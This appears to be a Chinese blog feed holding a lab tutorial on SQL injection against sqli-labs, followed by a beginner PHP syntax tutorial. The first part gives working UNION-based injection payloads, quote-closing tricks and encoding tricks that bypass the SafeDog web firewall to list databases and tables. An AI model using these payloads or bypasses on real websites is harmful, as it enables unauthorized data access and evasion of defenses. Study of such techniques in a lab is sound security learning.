<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ID：%&#39; union select 1,database(),user()&#39;%</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584078842647.png" alt="1584080162515"></p>
<h3 id="绕过过滤注释符号的注入"><a href="#绕过过滤注释符号的注入" class="headerlink" title="绕过过滤注释符号的注入"></a>绕过过滤注释符号的注入</h3><p>如果过滤注释符号</p>
<p>使用preg_replace函数 </p>
<p>注释注入在这里就不工作了，怎么办呢？</p>
<p>注入，不一定使用注释，也可以使用闭合</p>
<p>闭合不好之处就是，执行点少</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这里使用--+还是返回正确页面，因为网页将注释符给过滤掉了</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584185554495.png" alt="1584183906874"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">使用union select强制闭合</span><br><span class="line">$sql &#x3D; select * from users where id&#x3D;&#39;$id&#39;</span><br><span class="line">payload:-1&#39; union select 1,2,&#39;3</span><br><span class="line"></span><br><span class="line">我们来进行一个带入</span><br><span class="line">可以看到，带入之后-1被闭合了，3被闭合了，所以我们只有在2的位置进行一个sql语句</span><br><span class="line">执行点只有2，因为1被省略了网站不显示，3被闭合了不能使用</span><br><span class="line">$sql &#x3D; select * from users where id&#x3D;&#39;-1&#39; union select 1,2,&#39;3&#39;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584185630448.png" alt="1584184821104"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">还有一种就是 or 闭合</span><br><span class="line">select * from users where id&#x3D;&#39;$id&#39;</span><br><span class="line">plyload:-1&#39; union select 1,2,3 or &#39;1&#39;&#x3D;&#39;1</span><br><span class="line"></span><br><span class="line">这里还是 -1闭合了，or后面的全部闭合了，执行中间的一部分，</span><br><span class="line">带入：select * from users where id&#x3D;&#39;-1&#39; union select 1,2,3 or &#39;1&#39;&#x3D;&#39;1&#39;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584063112661.png" alt="1584185554495"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">虽然执行中间一部分就是union select 1,2,3，但是可控点还是只有2，只能在2的位置进行查询</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584186947810.png" alt="1584185630448"></p>
<h4 id="扩展思考"><a href="#扩展思考" class="headerlink" title="扩展思考"></a>扩展思考</h4><p>搜索性注入</p>
<p>select * from users where username like ‘%mysql%’</p>
<p>两种方法</p>
<p>第一种：注释</p>
<p>%’ union select 1,2,3 –+</p>
<p>第二种：闭合</p>
<p>%’ union select 1,2,3 ‘%</p>
<h3 id="过安全狗"><a href="#过安全狗" class="headerlink" title="过安全狗"></a>过安全狗</h3><h5 id="安全狗-waf-，也被称为网站应用级入侵防御系统，就是可以通过一些过滤来达到攻击效果"><a href="#安全狗-waf-，也被称为网站应用级入侵防御系统，就是可以通过一些过滤来达到攻击效果" class="headerlink" title="安全狗(waf)，也被称为网站应用级入侵防御系统，就是可以通过一些过滤来达到攻击效果"></a>安全狗(waf)，也被称为网站应用级入侵防御系统，就是可以通过一些过滤来达到攻击效果</h5><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p><a href="http://free.safedog.cn/website_safedog.html" target="_blank" rel="noopener">http://free.safedog.cn/website_safedog.html</a></p>
<p>注意：一定要改成系统服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">我们可以看到正常输入网址已经被拦截了，我们可以输出union select 发现页面还是显示防火墙，然后将a加入到union和select发现出错了，表示防火墙拦截的不是union也不是select而是拦截的 union select他们的一个整体</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584187385821.png" alt="1584186947810"></p>
<p>首先要判断安全狗识别的是哪一个关键字，怎么判断，在前面加上，干扰字符，比如a</p>
<p>判断安全狗拦截的union select 而并非union和select</p>
<p>我们看到aselect不会被拦截如何让aselect不执行给安全狗看</p>
<p>/* ! */符号是mysql一个特性就是，安全狗他在士必得时候会认为这是一个注释，不会对系统造成畏寒，所以，安全狗就不去拦截。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:127.0.0.1&#x2F;Less-2&#x2F;?id&#x3D;-1 union &#x2F;*select*&#x2F;1,2,3</span><br><span class="line">我们发现使用注释之后安全狗还进行拦截，怎么办呢</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584187649190.png" alt="1584187385821"></p>
<p>让aselect中a执行给安全狗看，实际执行的是select</p>
<p>%0a    换行</p>
<p>%23    注释</p>
<p>让a单独在一行，然后把这个a注释掉，select是不是就正常执行了，安全狗这边会认为是一个正常的注释，不会拦截</p>
<p>payload：-1 union %23a%0a//select/1,2,3</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:127.0.0.1&#x2F;Less-2&#x2F;?id&#x3D;-1 union %23a%0a&#x2F;*select*&#x2F;1,2,3</span><br><span class="line">这里我们发现了我们成功地绕过了安全狗的拦截</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584187950038.png" alt="1584187649190"></p>
<p>如果我们要查询数据库，还是按照之前的直接在2的位置打上database()是会被安全狗拦截的，所以我们判断安全狗拦截的是那一块内容，我们尝试在database(a)的括号里面加上一个a试试</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:127.0.0.1&#x2F;Less-2&#x2F;?id&#x3D;-1 union %23a%0a&#x2F;*select*&#x2F;1,database(a),3</span><br><span class="line">发现报错了，表示括号里的a没有被拦截，我们就可以判断安全狗拦截的是database而不是括号</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584188802374.png" alt="1584187950038"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">所以我将其database和()括号分开</span><br><span class="line">http:127.0.0.1&#x2F;Less-2&#x2F;?id&#x3D;-1 union %23a%0a&#x2F;*select*&#x2F;1,&#x2F;*!database*&#x2F;&#x2F;*!()*&#x2F;,3</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584188366327.png" alt="1584188050784"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">我们发现还拦截，所以我们就可以按照之前换行，注释a换行database的方法来将database显示出来</span><br><span class="line">http:127.0.0.1&#x2F;Less-2&#x2F;?id&#x3D;-1 union %23a%0a&#x2F;*select*&#x2F;1,%23a%0a&#x2F;*!database*&#x2F;&#x2F;*!()*&#x2F;,3</span><br><span class="line">我们发现成功地返回了我们的库名，也就说明了安全狗没有去拦截这样的一个函数</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584188050784.png" alt="1584188366327"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:127.0.0.1&#x2F;Less-2&#x2F;?id&#x3D;-1 union %23a%0a&#x2F;*select*&#x2F;1,group_concat table_name from information_schema.schemata,3</span><br><span class="line">我们可以在每个函数里面都放一个a查看哪一个函数被拦截，之后经过测试from被拦截了，其他都没有被拦截然后我们可以将from进行a注释换行</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584189188995.png" alt="1584188802374"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">先尝试&#x2F;*!from*&#x2F;如果被拦截还是用%23a%0a&#x2F;*!from*&#x2F;</span><br><span class="line"></span><br><span class="line">http:127.0.0.1&#x2F;Less-2&#x2F;?id&#x3D;-1 union %23a%0a&#x2F;*select*&#x2F;1,group_concat table_name %23a%0a&#x2F;*!from*&#x2F; information_schema.schemata,3</span><br><span class="line">我们发现成功地将内容显示出来了</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584189398751.png" alt="1584189188995"></p>
<p>获取一下表名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:127.0.0.1&#x2F;Less-2&#x2F;?id&#x3D;-1 union %23a%0a&#x2F;*select*&#x2F;1,group_concat table_name %23a%0a&#x2F;*!from*&#x2F; information_schema.tables where table_schema&#x3D;&#39;security&#39;,3</span><br><span class="line">直接返回成功，where并没有被拦截</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584189864602.png" alt="1584189398751"></p>
<p>安全狗防御防御效果很low。实际情况下，安全狗用的是最多的，但是，也是最好过的</p>
<p>安全狗，aliyundun，很好过，但是Godaddy很难过</p>
<p>mysql版本判断特性</p>
<p>/* 44509select */在mysql中不会进行报错的，这个44509是mysql的一个正常的判断，当mysql的版本大于44509就会执行select语句</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:127.0.0.1&#x2F;Less-2&#x2F;?id&#x3D;-1 union &#x2F;*44509select*&#x2F; 1,2,3</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200403142025653.png" alt="image-20200403142025653"></p>
]]></content>
  </entry>
  <entry>
    <title>php</title>
    <url>/2020/04/03/php/</url>
    <content><![CDATA[<h4 id="什么是PHP"><a href="#什么是PHP" class="headerlink" title="什么是PHP"></a>什么是PHP</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">	超文本预处理器</span><br><span class="line">运行原理</span><br><span class="line">		运行在服务器端的，内嵌在html中的脚本语言</span><br><span class="line">		集成环境有哪些</span><br><span class="line">					wampserver  xmapp  phpstudy  appserver</span><br><span class="line">					php引擎(7.0)  mysql(数据库 database)  apache(服务)</span><br><span class="line">		为什么学习的时候用集成环境</span><br><span class="line">			学习入门</span><br><span class="line">访问：</span><br><span class="line">	localhost  本机服务器名字&#x2F;php文件</span><br><span class="line">	127.0.0.1  你本机的ip地址&#x2F;php文件</span><br><span class="line">注意：</span><br><span class="line">	在写php代码的时候统统写在www目录下</span><br><span class="line">【开发工具】</span><br><span class="line">vim  subline 【notepad++】 phpstrom webstrom dw NetBeans</span><br><span class="line">【php信息】 </span><br><span class="line">	phpinfo();显示所有的php信息</span><br><span class="line">	他是模块化的，你需要什么，你必须给我开启那个模块</span><br><span class="line">	php.ini</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1582175685530.png" alt="1582175685530"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;index.php</span><br><span class="line">同样效果</span><br><span class="line">访问某个文件夹 默认会去访问这个文件夹下面的index.php 或者也会访问 index.html</span><br><span class="line">		文件夹下既有index.php也有index.html在我们的环境变量里，默认会去访问index.php</span><br><span class="line">		如果都没有，会将目录下的文件或文件夹列举出来</span><br><span class="line"></span><br><span class="line">文件或者目录只有放在www目录下面的文件才会被我们能访问的到</span><br><span class="line">我们写的PHP代码，放在根目录下面的文件夹胡总和文件里面，后对名是.php</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1582356332678.png" alt="1582178905188"></p>
<h4 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h4><h5 id="一、初识PHP脚本程序"><a href="#一、初识PHP脚本程序" class="headerlink" title="一、初识PHP脚本程序"></a>一、初识PHP脚本程序</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、php开始标记&lt;?php</span><br><span class="line">	结束标记?&gt;</span><br><span class="line"></span><br><span class="line">	&lt;?php </span><br><span class="line">		语句....</span><br><span class="line">	?&gt;</span><br><span class="line"></span><br><span class="line">    1) &lt;?php ?&gt;这之间就表示进入了PHP模式，在开始和结束标记之外的内容都会被PHP解析器忽略</span><br><span class="line">    2) 可以直接嵌入到html代码中，并且 </span><br><span class="line">            可以嵌入到html代码中的任何地方，在html文档中可以嵌入任意多个PHP标记！</span><br><span class="line">    3) 文件末尾的PHP代码段结束标记可以不要，在一些情况下省略掉更好！</span><br><span class="line"></span><br><span class="line">2、指令分隔符 &quot;;&quot; 分号</span><br><span class="line">	1)PHP语句分为两种，一种是在程序中使用结构定义语句，另一种是在程序中使用功能执行语句，前			者结尾不需要使用分号，后者必须使用分号结尾！</span><br><span class="line">	2)文件末尾的结束标志 ?&gt; 就隐含了一个分号，所以PHP代码最后一行可以不加分号</span><br><span class="line">	</span><br><span class="line">3、注释</span><br><span class="line">	&#x2F;*多行注释*&#x2F;</span><br><span class="line">	&#x2F;&#x2F;单行注释</span><br><span class="line">4、遇到空白的处理</span><br><span class="line">	空格、缩进、换行这些在PHP都是无关紧要的(注意：是要在英文输入法下输入)，可以将一个语句展			开成任意行，或者紧缩在一行，使用空格和空行可以增强代码的可读性，但是要合理运用，不			然会产生阅读负担</span><br></pre></td></tr></table></figure>

<h4 id="二、变量"><a href="#二、变量" class="headerlink" title="二、变量"></a>二、变量</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">概述：</span><br><span class="line">	临时(只有在我们的程序的运行过程中才存在)用于存储数据的容器</span><br><span class="line">1、变量的声明</span><br><span class="line">	声明：说白了就是事先通知！</span><br><span class="line">	在使用变量之前要事先通知，事先声明一下！</span><br><span class="line">	注意：在PHP中，使用变量的时候不需要声明</span><br><span class="line">	在PHP中变脸必须使用一个美元符号$ 后面跟着变量名来表示，赋值使用&#x3D;给一个变量赋值</span><br><span class="line">	例如：	$变量名&#x3D;数值;</span><br><span class="line">2、变量的销毁</span><br><span class="line">	unset() &#x2F;&#x2F; 使用语法：unset($变量名)</span><br><span class="line">	&lt;?php</span><br><span class="line">        $handsome &#x3D; 25;</span><br><span class="line">        unset($handsome);</span><br><span class="line">        echo $handsome;</span><br><span class="line">     ?&gt;</span><br><span class="line">3、变量的命名</span><br><span class="line">	1) 严格区分大小写</span><br><span class="line">	2) 变量名称可以是字母、数字、下划线，但不能以数字开头</span><br><span class="line">4、PHP中有一些关键字，其他编程语言中不能使用他们中的任何一个做为常量、函数名或类名。</span><br><span class="line">	但是可以在PHP中做为变量名称使用，不推荐使用关键字，</span><br><span class="line">5、可变变量(了解)</span><br><span class="line">	可变变量就是不是固定的数据，可以随时改变的</span><br><span class="line">	$result &#x3D; &quot;handsome&quot;;</span><br><span class="line">    $$result &#x3D; &quot;英俊&quot;;</span><br><span class="line">    echo $handsome;</span><br><span class="line"></span><br><span class="line">6、引用赋值</span><br><span class="line">	引用赋值大白话讲就是给变量起别名</span><br><span class="line">	$a &#x3D; 10;</span><br><span class="line">	&#x2F;&#x2F; $b &#x3D; $a;		&#x2F;&#x2F; 这种操作修改$b并不会影响另外一个值</span><br><span class="line">    $b &#x3D; &amp;$a;		&#x2F;&#x2F; 修改任意一方都会影响</span><br><span class="line">    $b &#x3D; 20;</span><br><span class="line">    echo $a;</span><br><span class="line">&#x2F;&#x2F; 应该可以理解为，没起别名之前$a和$b是单独的，起完别名之后$b&#x3D;&amp;$b这样他们两个就变成了要给整体</span><br><span class="line">	修改任意一方就会改变。</span><br></pre></td></tr></table></figure>

<h4 id="三、变量类型"><a href="#三、变量类型" class="headerlink" title="三、变量类型"></a>三、变量类型</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">概述：</span><br><span class="line">	变量类型就是指保存在该变量中的数据类型</span><br><span class="line">	具有相同类型的类型才能彼此操作</span><br><span class="line">	</span><br><span class="line">	在强类型的语言中例如:C语言、java等，变量需要先指定类型，然后才能存储对应指定的数据</span><br><span class="line">	但是PHP是一种弱类型的语言，和其他语言不同的是，变量或者常量的数据类型由程序上下文决定</span><br><span class="line">	不需要示先声明类型</span><br><span class="line">	</span><br><span class="line"> 1、变量类型</span><br><span class="line"> 	使用var_dump(变量名) &#x2F;&#x2F; 可以输出变量的类型</span><br><span class="line"> 	$a &#x3D; true;</span><br><span class="line">	var_dump($a);	&#x2F;&#x2F; 返回true</span><br><span class="line"></span><br><span class="line"> 	1) bool(布尔型)</span><br><span class="line">        布尔型只有两个，true和false，真或假</span><br><span class="line">        以下值认为是false，其他值被认为是true</span><br><span class="line">        ①布尔值false</span><br><span class="line">        ②0</span><br><span class="line">        ③浮点数0.0</span><br><span class="line">        ④空白字符串和字符串0</span><br><span class="line">        ⑤没有成员组的数组</span><br><span class="line">        ⑥NULL</span><br><span class="line"> 	</span><br><span class="line"> 	2) int(整形)</span><br><span class="line"> 		存储整数</span><br><span class="line"> 		</span><br><span class="line"> 	3) float(浮点型)</span><br><span class="line"> 		存储小数</span><br><span class="line"> 		</span><br><span class="line"> 	4) str(字符型)</span><br><span class="line"> 		使用单引号，双引号，定界符就是字符</span><br><span class="line"> 		PHP也是可以使用\反斜杠进行转义</span><br><span class="line"> 		单引号:</span><br><span class="line"> 			在单引号中不管放什么变量都不会查找</span><br><span class="line"> 			&#x2F;&#x2F; 他不管你单引号中有什么东西，都会给你直接输出</span><br><span class="line"> 				$a &#x3D; true;</span><br><span class="line">                $b &#x3D; &#39;hand $a some&#39;;</span><br><span class="line">                echo $b; &#x2F;&#x2F;输出结果是: hand $a some</span><br><span class="line">          </span><br><span class="line">		双引号:</span><br><span class="line">            在双引号中，如果你放入其他变量他就会进行查找</span><br><span class="line">            &#x2F;&#x2F; 输出结果会报错，因为双引号中有$a变量，PHP会进行查找，</span><br><span class="line">            		查找之后发现变量a后面还跟着some，但是却没有$asome这个变量所以报错</span><br><span class="line"> 				$a &#x3D; true;</span><br><span class="line">                $b &#x3D; &quot;hand$asome&quot;;</span><br><span class="line">                echo $b; </span><br><span class="line">             正确语法:</span><br><span class="line">             &#x2F;&#x2F; 这里应该使用花括号将其括起来，跟后面字符分隔开，表示花括号内的是变量</span><br><span class="line">             	$a &#x3D; true;</span><br><span class="line">                $b &#x3D; &quot;hand&#123;$a&#125;some&quot;;</span><br><span class="line">                echo $b;	&#x2F;&#x2F;输出结果是:hand1some,true转换成数字是1</span><br><span class="line">		</span><br><span class="line">		定界符:</span><br><span class="line">			&lt;&lt;&lt;之后提供一个标识符开始，然后是 字符串的内容 最后是同样的标识符结束</span><br><span class="line">			注意:标识符之后必须接，不可以用其他的任何字符。</span><br><span class="line">			语法:</span><br><span class="line">                $a &#x3D; &lt;&lt;&lt;handsome</span><br><span class="line">                我现在是字符串吗？</span><br><span class="line">                handsome;</span><br><span class="line">                var_dump($a);</span><br><span class="line">            &#x2F;&#x2F; 如果其中也要加入其他变量的话，也需要把要加入的变量用花括号括起来</span><br><span class="line">            &#x2F;&#x2F; 如果不加花括号会报错，和双引号一样，而在定界符中可以包含单引号和双引号</span><br><span class="line">            语法:</span><br><span class="line">            	$b &#x3D; &quot;一个&quot;;</span><br><span class="line">            	$a &#x3D; &lt;&lt;&lt;handsome	</span><br><span class="line">                &#39;&#39;&#39;我现&#39;在&quot;是&#123;$b&#125;字符&quot;串&quot;&quot;吗？</span><br><span class="line">                handsome;	&#x2F;&#x2F; 结尾的标识符必须和开头定界符后面跟的标识符相同</span><br><span class="line">                var_dump($a);</span><br><span class="line">			</span><br><span class="line"> 	5) array(数组)</span><br><span class="line">    	数组是PHP中一种重要的符合数据类型。</span><br><span class="line">    	之前的类型只能存入一个数据，而数组可以存放多个数据，并且可以存入任何类型的数据。</span><br><span class="line">    	跳过，后面课程讲解</span><br><span class="line"> 	6) object(对象)</span><br><span class="line"> 		跳过，后面课程讲解</span><br><span class="line"> 	7)resourse(自愿)</span><br><span class="line"> 		跳过，后面课程讲解</span><br><span class="line"> 	8)NULL</span><br><span class="line"> 		NULL表示空</span><br><span class="line"> 			&#x2F;&#x2F; a变量没有赋值，也就相当于没有这个变量，返回NULL</span><br><span class="line"> 			&#x2F;&#x2F; 可以将a删除，然后直接打印a的数据类型，结果一样为NULL</span><br><span class="line">            $a;</span><br><span class="line">            var_dump($a);</span><br><span class="line">            </span><br><span class="line">2、变量类型转换</span><br><span class="line">	1) 自动类型转换</span><br><span class="line">		布尔值:</span><br><span class="line">			布尔值参与运算时，true转换为整型为 1 ， false 为 0</span><br><span class="line">			null值参与运算时，null转换为整形0</span><br><span class="line">			int型和float数据参与运算时，先把int转换为float类型后在进行运算</span><br><span class="line">			有字符串和数字型(int或者float)参与运算时的情况</span><br><span class="line">				- 这些都是程序运行中不太可控的部分所以在编写代码时最好不要涉及</span><br><span class="line">			</span><br><span class="line">	2) 强制类型转换</span><br><span class="line">		在要转换的变量之前加上括号括起来目标类型</span><br><span class="line">			语法：</span><br><span class="line">				$a &#x3D; &quot;test&quot;;</span><br><span class="line">                $b &#x3D; (int)$a;</span><br><span class="line">                var_dump($b);  &#x2F;&#x2F; 转换结果是 int(0)</span><br><span class="line">			(int)</span><br><span class="line">			(bool)</span><br><span class="line">			(float)</span><br><span class="line">			(string)</span><br><span class="line">			(array)</span><br><span class="line">			(object)</span><br><span class="line">			</span><br><span class="line">		转变并不会改变被转换变量本身的类型 </span><br><span class="line">		</span><br><span class="line">	3)变量类型测试函数</span><br><span class="line">		语法：</span><br><span class="line">			$a &#x3D; 10;</span><br><span class="line">			var_dump(is_int($a));</span><br><span class="line">			</span><br><span class="line">		is_bool()	&#x2F;&#x2F; 检测一个变量是否为布尔值</span><br><span class="line">		is_int()	&#x2F;&#x2F; 检测一个变量是否为整数</span><br><span class="line">		is_array()	&#x2F;&#x2F; 检测一个变量是否为数组</span><br><span class="line">		等等....</span><br></pre></td></tr></table></figure>

<h4 id="四、常量"><a href="#四、常量" class="headerlink" title="四、常量"></a>四、常量</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、概念</span><br><span class="line">    常量也是用于临时(只有在我们的程序的运行过程中才存在)用于存储数据的容器</span><br><span class="line">2、定义和使用</span><br><span class="line">	语法：</span><br><span class="line">	&#x2F;&#x2F; 定义常量名称的时候需要用引号将常量名称括起来，单引双引都可以</span><br><span class="line">		define(&#39;常量名称&#39;,常量值);		</span><br><span class="line">	&#x2F;&#x2F; 检查是否定义了某个常量</span><br><span class="line">		defined()函数	</span><br><span class="line">	常量的命名与变量类似，也遵循PHP标识符的名称规则，按照惯例常量名称总是大写的</span><br><span class="line">3、常量变量的区别</span><br><span class="line">	1)常量只能用define()函数定义，不能通过赋值语句</span><br><span class="line">	2)常量只能用define()定义，不能通过赋值语句</span><br><span class="line">	3)常量可以不用理会变量范围的规则在任何地方定义和使用</span><br><span class="line">	4)常量一旦被定义就不能被重新定义或者取消定义</span><br><span class="line">	5)常量的值只能是bool，int，float，string类型</span><br><span class="line">4、预定义常量</span><br><span class="line">	预定义常量说白了就是我们的PHP内核已经帮我们定义好了的常量</span><br><span class="line">	其中有的预定义常量是以__两个下划线开头的，这些预定义常量我们又叫他魔术常量</span><br><span class="line">		代码所在的位置不同他的值也是不同的，所以他叫 魔术常量</span><br><span class="line">	</span><br><span class="line"> 这些特殊的常量是不区分大小写的，还是一样，建议最好常量使用大写，这样不容易混淆</span><br><span class="line"> 而自己定义的常量是严格区分大小写的</span><br><span class="line">	常量名				常量值</span><br><span class="line">	__FILE__		当前的文件位置</span><br><span class="line">	__LINE__		当前所在行数</span><br><span class="line">	__FUNCTION__	当前的函数名</span><br><span class="line">	__CLASS__		当前的类名</span><br><span class="line">	__METHOD__		当前对象的方法名</span><br><span class="line">	等等....</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1582178905188.png" alt="1582260055891"></p>
<h4 id="五、运算符"><a href="#五、运算符" class="headerlink" title="五、运算符"></a>五、运算符</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">运算符对一个或者多个操作数(变量或者数值)执行某种运算符的符号，也称操作符~</span><br><span class="line"></span><br><span class="line">1、算术运算符</span><br><span class="line">	+	两边数值相加</span><br><span class="line">	-	两边数值相减，也可以取反，取反的时候并不会影响到被取反变量本身的值</span><br><span class="line">	*	两边数值相乘</span><br><span class="line">	&#x2F;	两边数值相除</span><br><span class="line">	%	两边数值相除，并求余</span><br><span class="line">	++	自加1</span><br><span class="line">	--	自减1</span><br><span class="line">	注意:自增自减是对变量而言的</span><br><span class="line">2、字符串运算符</span><br><span class="line">	PHP中的字符串运算符只有一个英文的句号 &quot; . &quot; 也叫连接运算符</span><br><span class="line">		$a &#x3D; &quot;孙悟空&quot;;</span><br><span class="line">        $b &#x3D; &quot;在水帘洞居住&quot;;</span><br><span class="line">        $c &#x3D; $a.$b;</span><br><span class="line">        echo $c;	&#x2F;&#x2F; 输出结果是:孙悟空在水帘洞居住</span><br><span class="line">3、赋值运算符</span><br><span class="line">	二元运算符</span><br><span class="line">		左边的操作数必须是变量，右边可以是表达式，也可以是一个值，一个变量等等</span><br><span class="line">		作用:将右边表达式的值赋给左边变量</span><br><span class="line">	&#x3D; 		</span><br><span class="line">	+&#x3D;</span><br><span class="line">	-&#x3D;</span><br><span class="line">	*&#x3D;</span><br><span class="line">	&#x2F;&#x3D;</span><br><span class="line">	%&#x3D;</span><br><span class="line">	.&#x3D;</span><br><span class="line">4、比较运算符</span><br><span class="line">	对操作数进行比较</span><br><span class="line">		如果比较结果满足于比较运算符要求，返会结果true，否则false</span><br><span class="line">	&#x3D;&#x3D;		等于</span><br><span class="line">	&#x3D;&#x3D;&#x3D;		全等于(值要相等，类型也要相等)</span><br><span class="line">	!&#x3D;		不等于</span><br><span class="line">	&lt;&gt;		不等于</span><br><span class="line">	!&#x3D;&#x3D;		不全等于</span><br><span class="line">	&lt;&#x3D;		小于等于</span><br><span class="line">	&lt;		小于</span><br><span class="line">	&gt;&#x3D;		大于等于</span><br><span class="line">	&gt;		大于</span><br><span class="line">5、逻辑运算符</span><br><span class="line">概念:</span><br><span class="line">	对表达式进行逻辑运算，运算出的结果是布尔类型</span><br><span class="line">	要求:</span><br><span class="line">		参与逻辑运算的表达式的值是布尔类型的值，如果不是布尔类型的值会被自动转换成布尔类型的值</span><br><span class="line">	逻辑与</span><br><span class="line">		and 或者 &amp;&amp;  		&#x2F;&#x2F;运算结果两边都为true结果为true，否则为false</span><br><span class="line">	逻辑或</span><br><span class="line">		or 或者 ||		&#x2F;&#x2F;运算结果有一边为true结果为true</span><br><span class="line">	逻辑异或</span><br><span class="line">		xor				&#x2F;&#x2F;只有两边值不一样的时候结果为true，如果两边值一样就是false</span><br><span class="line">	逻辑非</span><br><span class="line">		！			&#x2F;&#x2F;将原来的值否定，如果是true返回false，如果是false返回true</span><br><span class="line">6、其他运算符</span><br><span class="line">	1) ? :		&#x2F;&#x2F;三元运算符</span><br><span class="line">	格式:</span><br><span class="line">		表达式1 ? 表达式2 : 表达式3;</span><br><span class="line">		如果表达式1的值为true，那么就执行表达式2，否则执行表达式3   </span><br><span class="line">	2) &#96;&#96;</span><br><span class="line">		可以吧系统的命令放到里面执行！</span><br><span class="line">		基本用不到，涉及到跨平台</span><br><span class="line">	3) @</span><br><span class="line">		屏蔽表达式发生的错误</span><br><span class="line">		echo @$a;</span><br><span class="line">	4)&#x3D;&gt;</span><br><span class="line">	5)-&gt;</span><br><span class="line">	6)instanceot</span><br><span class="line">7、运算符优先级</span><br><span class="line">		谁的优先级高先算谁，如果实在不知道谁的优先级高，使用()括号将其括起来</span><br></pre></td></tr></table></figure>

<h4 id="一、流程控制"><a href="#一、流程控制" class="headerlink" title="一、流程控制"></a>一、流程控制</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">对PHP程序执行的过程进行控制</span><br><span class="line">PHP有哪些手段对程序过程进行控制</span><br><span class="line"></span><br><span class="line">一、顺序执行</span><br><span class="line">		顺序执行非常简单就是从上往下执行即可</span><br><span class="line">二、分支执行</span><br><span class="line">		分支执行可以根据条件是否满足来选择执行某些代码，PHP的分支执行主要通过两种语句(if,switch)来实现</span><br><span class="line">		</span><br><span class="line">	1、if语句</span><br><span class="line">		1) 单向条件</span><br><span class="line">		if(表达式)语句;</span><br><span class="line">			格式:</span><br><span class="line">				if($result &gt;&#x3D; $number)&#123;</span><br><span class="line">						echo &quot;恭喜你考试成功&quot;;</span><br><span class="line">					&#125; </span><br><span class="line">					</span><br><span class="line">		2)双向条件</span><br><span class="line">			if&#123;</span><br><span class="line">				语句...</span><br><span class="line">			&#125;</span><br><span class="line">			else&#123;</span><br><span class="line">				语句...</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">		3)多向条件</span><br><span class="line">			if(表达式)&#123;</span><br><span class="line">				语句...</span><br><span class="line">			&#125;</span><br><span class="line">			elseif&#123;</span><br><span class="line">				语句块...</span><br><span class="line">			&#125;</span><br><span class="line">			elseif&#123;</span><br><span class="line">				语句...</span><br><span class="line">			&#125;</span><br><span class="line">			else&#123;</span><br><span class="line">				语句块...</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">	2、switch语句</span><br><span class="line">		格式:</span><br><span class="line">			switch(表达式)&#123;</span><br><span class="line">				case 值 1:</span><br><span class="line">					语句块1</span><br><span class="line">					break</span><br><span class="line">				case 值 2:</span><br><span class="line">					语句块2</span><br><span class="line">					break</span><br><span class="line">				......</span><br><span class="line">                default:</span><br><span class="line">                	语句块n</span><br><span class="line">			&#125;</span><br><span class="line">		注意点:</span><br><span class="line">			1)表达式的值最好是整形或者字符串！</span><br><span class="line">			2)不要忘记break语句！来跳出switch语句！每个case语句后面都加上break</span><br><span class="line">			3)如果某个case语句后面并没有接语句块，那么就说明这个语句块的内容是同下的</span><br></pre></td></tr></table></figure>

